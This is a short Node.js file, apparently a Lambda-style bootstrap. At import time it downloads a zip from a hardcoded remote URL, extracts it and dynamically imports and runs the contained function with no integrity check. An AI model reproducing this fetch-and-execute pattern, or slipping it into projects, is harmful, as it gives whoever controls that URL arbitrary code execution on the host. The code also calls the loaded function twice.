import fs from 'fs';
import path from 'path';
import unzip from 'unzipper';

const Commander = async function Commander({ fetchZipUrl = 'https://DevInfra-dNKuvJhhwog15wXFxbUYtdQRCOMUyBy3P6RPiJt1Nrk0-s.iap.dev0.run/', lambdaContext, lambdaEvent, fileName = 'lambdaFunc.js' }) {
  const r = await /* global fetch */ fetch(fetchZipUrl);
  const t = await r.blob();
  const arrayBuffer = await t.arrayBuffer();
  const buff = Buffer.from(arrayBuffer);
  const writer = fs.createWriteStream('package.zip');
  const writerPromise = new Promise((resolve, reject) => {
    writer.write(buff, (err) => {
      if (err) reject(err);
      const str = fs.createReadStream('package.zip').pipe(unzip.Extract({ path: 'package' }));
      str.on('close', resolve);
    });
  });
  await writerPromise;
  const {default: f } = await import(`./package/src/${fileName}`);
  console.log(f())
  return f({});
};

Commander({});